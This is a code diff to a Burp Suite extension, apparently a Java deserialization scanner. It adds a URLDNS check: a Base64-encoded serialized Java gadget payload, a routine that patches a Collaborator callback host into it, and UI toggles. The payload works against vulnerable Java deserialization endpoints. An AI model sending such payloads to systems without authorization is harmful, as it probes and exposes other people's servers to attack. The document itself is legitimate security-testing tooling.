@@ -77,6 +77,7 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, ITab, ActionL
     private HashMap<String,byte[]> payloadsSleep;
     private HashMap<String,byte[]> payloadsDNS;
     private byte[] payloadSerialDosLimited;
+    private byte[] payloadURLDNS;
     
     // This is necessary because these payloads requires further modifications
     private ArrayList<String> payloadsDNStemplateImpl;
@@ -105,6 +106,7 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, ITab, ActionL
     private JEditorPane resultAreaManualTesting;
     private JCheckBox enableActiveScanSleepChecks;
     private JCheckBox enableActiveScanDNSChecks;
+    private JCheckBox enableActiveScanURLDNSChecks;
     //private JCheckBox aggressiveMode;
     private JCheckBox verboseModeManualTesting;
     private JCheckBox addManualIssueToScannerResultManualTesting;
@@ -202,9 +204,10 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, ITab, ActionL
     static final int TYPE_GZIP = 4;
     
     static final String TEST_SLEEP = "Sleep";
-    static final String TEST_DNS = "DNS";
+    static final String TEST_DNS = "DNS (vuln libraries)";
+    static final String TEST_URLDNS = "DNS (JRE only)";
     static final String TEST_CPU = "CPU";
-    static final String[] TEST_TYPES = new String[]{TEST_SLEEP, TEST_DNS, TEST_CPU};
+    static final String[] TEST_TYPES = new String[]{TEST_SLEEP, TEST_DNS, TEST_URLDNS, TEST_CPU};
     
         
     /*
@@ -290,6 +293,8 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, ITab, ActionL
         payloadsDNStemplateImpl.add("Spring Alternate Payload (DNS)");
         payloadsDNStemplateImpl.add("Java 6 and Java 7 (up to Jdk7u21) (DNS)");
         payloadsDNStemplateImpl.add("Java 8 (up to Jdk8u20) (DNS)");
+        
+        payloadURLDNS = Base64.decodeBase64("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QACFhYWFhYLml0dAAAcQB+AAV0AARodHRwcHh0AA9odHRwOi8vWFhYWFguaXR4");
         
         // Initialize the Serial Dos Limited payload (limited version of https://gist.github.com/coekie/a27cc406fc9f3dc7a70d)
         // This payload causes a high CPU consumption for a limited amount of time. The CPU time depends on the server hardware, but can be approximately 
@@ -701,11 +706,17 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, ITab, ActionL
                 enableActiveScanSleepChecks.addActionListener(BurpExtender.this);
                 enableActiveScanSleepChecks.setAlignmentX(Component.LEFT_ALIGNMENT);
                 
-                enableActiveScanDNSChecks = new JCheckBox("Enable active scan DNS checks");
+                enableActiveScanDNSChecks = new JCheckBox("Enable active scan DNS checks (through vulnerable libraries)");
                 enableActiveScanDNSChecks.setSelected(true);
                 enableActiveScanDNSChecks.setActionCommand("enableDisableActiveScanDNSChecks");
                 enableActiveScanDNSChecks.addActionListener(BurpExtender.this);
                 enableActiveScanDNSChecks.setAlignmentX(Component.LEFT_ALIGNMENT);
+                
+                enableActiveScanURLDNSChecks = new JCheckBox("Enable active scan DNS checks (URLDNS, Java JRE only)");
+                enableActiveScanURLDNSChecks.setSelected(true);
+                enableActiveScanURLDNSChecks.setActionCommand("enableDisableActiveScanURLDNSChecks");
+                enableActiveScanURLDNSChecks.addActionListener(BurpExtender.this);
+                enableActiveScanURLDNSChecks.setAlignmentX(Component.LEFT_ALIGNMENT);
                 
                 //aggressiveMode = new JCheckBox("Aggressive mode (increase a lot the requests)");  
                 
@@ -754,6 +765,7 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, ITab, ActionL
                 mainPanelConfiguration.add(configurationTitleScanner);
                 mainPanelConfiguration.add(enableActiveScanSleepChecks);
                 mainPanelConfiguration.add(enableActiveScanDNSChecks);
+                mainPanelConfiguration.add(enableActiveScanURLDNSChecks);
                 //mainPanelConfiguration.add(aggressiveMode);
                 mainPanelConfiguration.add(separatorConfigurationScanner);
                 mainPanelConfiguration.add(configurationTitleManualTesting);
@@ -1090,7 +1102,17 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, ITab, ActionL
 			IBurpCollaboratorClientContext collaboratorContext = callbacks.createBurpCollaboratorClientContext();
             
 			HashMap<String,byte[]> currentPayloads = new HashMap<String,byte[]>();
-			HashMap<String,String> dnsCollaboratorUrls = null;
+			HashMap<String,String> dnsCollaboratorUrls = new HashMap<String,String>();
+			
+			// URLDNS
+			if(enableActiveScanURLDNSChecks.isSelected()) {
+				
+				String urlDnsCollaboratorUrl = collaboratorContext.generatePayload(true);				
+				byte[] urldnsFinalPayload = createUrlDnsVector(payloadURLDNS,urlDnsCollaboratorUrl);
+				currentPayloads.put("URLDNS", urldnsFinalPayload);
+				dnsCollaboratorUrls.put("URLDNS", urlDnsCollaboratorUrl);
+				
+			}
 						
 			// Sleep payloads
 			if(enableActiveScanSleepChecks.isSelected()) {
@@ -1100,9 +1122,6 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, ITab, ActionL
 			} 
 			
 			if(enableActiveScanDNSChecks.isSelected()) {
-
-				//currentPayloads = new HashMap<String,byte[]>();
-				dnsCollaboratorUrls = new HashMap<String,String>();
 								
 				Set<String> payloadDnsKeys = payloadsDNS.keySet();
 				Iterator<String> iter = payloadDnsKeys.iterator();
@@ -1130,6 +1149,7 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, ITab, ActionL
     		Iterator<String> iter = payloadKeys.iterator();
     		String currentKey;
     		while (iter.hasNext()) {
+    			
     			currentKey = iter.next();
         		byte[] newPayload = null;
         		
@@ -1228,7 +1248,7 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, ITab, ActionL
     			IBurpCollaboratorClientContext collaboratorContext = callbacks.createBurpCollaboratorClientContext();
                 
     			HashMap<String,byte[]> currentPayloads = new HashMap<String,byte[]>();
-    			HashMap<String,String> dnsCollaboratorUrls = null;
+    			HashMap<String,String> dnsCollaboratorUrls = new HashMap<String,String>();
     						
     			// Sleep payloads
     			if(enableActiveScanSleepChecks.isSelected()) {
@@ -1237,10 +1257,20 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, ITab, ActionL
     			
     			} 
     			
+    			// URLDNS
+    			if(enableActiveScanURLDNSChecks.isSelected()) {
+    				
+    				String urlDnsCollaboratorUrl = collaboratorContext.generatePayload(true);				
+    				byte[] urldnsFinalPayload = createUrlDnsVector(payloadURLDNS,urlDnsCollaboratorUrl);
+    				currentPayloads.put("URLDNS", urldnsFinalPayload);
+    				dnsCollaboratorUrls.put("URLDNS", urlDnsCollaboratorUrl);
+    				
+    			}
+    			
+    			// DNS
     			if(enableActiveScanDNSChecks.isSelected()) {
     				
     				//currentPayloads = new HashMap<String,byte[]>();
-    				dnsCollaboratorUrls = new HashMap<String,String>();
     								
     				Set<String> payloadDnsKeys = payloadsDNS.keySet();
     				Iterator<String> iter = payloadDnsKeys.iterator();
@@ -1503,7 +1533,7 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, ITab, ActionL
 			
 			sendToDeserializationTester(hostManualTesting,portManualTesting,useHttpsManualTesting,requestAreaManualTesting);
 			
-		} else if(command.equals("enableDisableActiveScanSleepChecks") || command.equals("enableDisableActiveScanDNSChecks")) {
+		} else if(command.equals("enableDisableActiveScanSleepChecks") || command.equals("enableDisableActiveScanDNSChecks") || command.equals("enableDisableActiveScanURLDNSChecks")) {
 			
 			enableDisableActiveScanChecks();
 			
@@ -1638,7 +1668,7 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, ITab, ActionL
 	
 	public void enableDisableActiveScanChecks() {
 		
-		if(enableActiveScanSleepChecks.isSelected() || enableActiveScanDNSChecks.isSelected()) {
+		if(enableActiveScanSleepChecks.isSelected() || enableActiveScanDNSChecks.isSelected() || enableActiveScanURLDNSChecks.isSelected()) {
 			
 			callbacks.registerScannerCheck(this);
 			
@@ -1842,7 +1872,7 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, ITab, ActionL
 			byte[] postPayloadRequest = requestString.substring(payloadTo+1,requestString.length()).getBytes();
 			HashMap<String,byte[]> currentPayloads = null;
 			
-			HashMap<String,String> dnsCollaboratorUrls = null;
+			HashMap<String,String> dnsCollaboratorUrls = new HashMap<String,String>();
 			
 			// Sleep payloads
 			if(testType.equals(BurpExtender.TEST_SLEEP)) {
@@ -1859,11 +1889,22 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, ITab, ActionL
 				
 				resultAreaManualTesting.setText("<p><b>SCANNING IN PROGRESS</b></p>"
 	    				+ "<p>Scanning can go on approximately from 1 second up to 10 minutes, based on presence of the issue and the computational power of the server</p>");
+			
+			} else if(testType.equals(BurpExtender.TEST_URLDNS)) {
+				
+				currentPayloads = new HashMap<String,byte[]>();
+				
+				String currentCollaboratorPayload = collaboratorContext.generatePayload(true);    			
+    			byte[] dnsPayloadWithCollaboratorPayload = createUrlDnsVector(payloadURLDNS,currentCollaboratorPayload);    			
+    			currentPayloads.put("URLDNS", dnsPayloadWithCollaboratorPayload);
+    			dnsCollaboratorUrls.put("URLDNS", currentCollaboratorPayload);
+				
+				resultAreaManualTesting.setText("<p><b>SCANNING IN PROGRESS</b></p>");
 				
 			} else if(testType.equals(BurpExtender.TEST_DNS)) {
 				
 				currentPayloads = new HashMap<String,byte[]>();
-				dnsCollaboratorUrls = new HashMap<String,String>();
+				
 				
 				resultAreaManualTesting.setText("<p><b>SCANNING IN PROGRESS</b></p>");
 								
@@ -1928,7 +1969,7 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, ITab, ActionL
         		result = result + "<li>" + currentKey + ": ";
         		        		
         		List<IBurpCollaboratorInteraction> collaboratorInteractions = null;
-        		if(testType.equals(BurpExtender.TEST_DNS)) {
+        		if(testType.equals(BurpExtender.TEST_DNS) || testType.equals(BurpExtender.TEST_URLDNS)) {
         			collaboratorInteractions = collaboratorContext.fetchCollaboratorInteractionsFor(dnsCollaboratorUrls.get(currentKey));
         		}
         		
@@ -1954,7 +1995,7 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, ITab, ActionL
         		*/
         		
         		//if(( testType.equals(BurpExtender.TEST_SLEEP) && (((int)duration) >= 10)) || ( testType.equals(BurpExtender.TEST_CPU) && (((int)duration) >= 60)) ){
-        		if( ( ( testType.equals(BurpExtender.TEST_SLEEP) || testType.equals(BurpExtender.TEST_CPU) ) && (((int)duration) >= 10) ) || ( testType.equals(BurpExtender.TEST_DNS) && ( collaboratorInteractions.size() > 0 ) ) ) {
+        		if( ( ( testType.equals(BurpExtender.TEST_SLEEP) || testType.equals(BurpExtender.TEST_CPU) ) && (((int)duration) >= 10) ) || (( testType.equals(BurpExtender.TEST_DNS) || testType.equals(BurpExtender.TEST_URLDNS) ) && ( collaboratorInteractions.size() > 0 ) ) ) {
         			
         			positiveResult = true;
         			
@@ -2064,6 +2105,37 @@ public class BurpExtender implements IBurpExtender, IScannerCheck, ITab, ActionL
 			newVector[indexOfPattern+13] = (byte)(newVector[indexOfPattern+13] + (newCollaboratorVectorLength - 5));
 									
 		}
+		
+		return newVector;
+		
+	}
+	
+	public byte[] createUrlDnsVector(byte[] origVector, String collaboratorURL) {
+		
+		String firstValueToSearch = "http://XXXXX.it";
+		String collaboratorUrlFirst = "http://" + collaboratorURL;
+		int collaboratorFirstLength = collaboratorUrlFirst.length();
+			
+		int indexFirstCharacterFirstValueToSearch = helpers.indexOf(origVector, firstValueToSearch.getBytes(), true, 0, origVector.length);
+		int indexLastCharacterFirstValueToSearch = indexFirstCharacterFirstValueToSearch + firstValueToSearch.length() -1;
+		byte[] preDNSVectorFirstValueToSearch = Arrays.copyOfRange(origVector, 0, indexFirstCharacterFirstValueToSearch);
+		byte[] postDNSVectorFirstValueToSearch = Arrays.copyOfRange(origVector, indexLastCharacterFirstValueToSearch+1, origVector.length);
+		preDNSVectorFirstValueToSearch[preDNSVectorFirstValueToSearch.length-1] = (byte)collaboratorFirstLength;
+		byte[] tempVector = ArrayUtils.addAll(preDNSVectorFirstValueToSearch, collaboratorUrlFirst.getBytes());
+		tempVector = ArrayUtils.addAll(tempVector, postDNSVectorFirstValueToSearch);
+		
+		//0x08 (len) + XXXXX.it
+		byte[] secondValueToSearch = {(byte)0x08,(byte)0x58,(byte)0x58,(byte)0x58,(byte)0x58,(byte)0x58,(byte)0x2e,(byte)0x69,(byte)0x74};
+		String collaboratorUrlSecond = collaboratorURL;
+		int collaboratorSecondLength = collaboratorURL.length();
+		
+		int indexFirstCharacterSecondValueToSearch = helpers.indexOf(tempVector, secondValueToSearch, true, 0, tempVector.length) + 1; //First researched char is length, the +1 skip to first char of the string
+		int indexLastCharacterSecondValueToSearch = indexFirstCharacterSecondValueToSearch + secondValueToSearch.length -2;
+		byte[] preDNSVectorSecondValueToSearch = Arrays.copyOfRange(tempVector, 0, indexFirstCharacterSecondValueToSearch);
+		byte[] postDNSVectorSecondValueToSearch = Arrays.copyOfRange(tempVector, indexLastCharacterSecondValueToSearch+1, tempVector.length);		
+		preDNSVectorSecondValueToSearch[preDNSVectorSecondValueToSearch.length-1] = (byte)collaboratorSecondLength;
+		byte[] newVector = ArrayUtils.addAll(preDNSVectorSecondValueToSearch, collaboratorUrlSecond.getBytes());
+		newVector = ArrayUtils.addAll(newVector, postDNSVectorSecondValueToSearch);
 		
 		return newVector;
 		
